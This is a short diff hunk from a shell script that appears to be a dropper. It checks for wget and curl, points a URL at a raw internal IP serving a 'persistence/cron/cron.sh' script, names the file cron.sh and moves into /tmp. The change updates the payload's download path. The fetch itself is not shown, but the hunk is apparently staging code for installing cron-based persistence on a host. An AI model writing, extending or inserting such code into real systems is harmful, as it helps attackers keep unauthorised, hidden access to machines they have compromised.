@@ -3,7 +3,7 @@
 FALSE=$(/bin/false)
 HAS_WGET=$(which wget)
 HAS_CURL=$(which curl)
-URL="http://10.2.45.121:11000/persistence/cron/cron.sh"
+URL="http://10.2.45.121:11000/preload/scripts/persistence/cron/cron.sh"
 FILENAME="cron.sh"
 
 cd /tmp
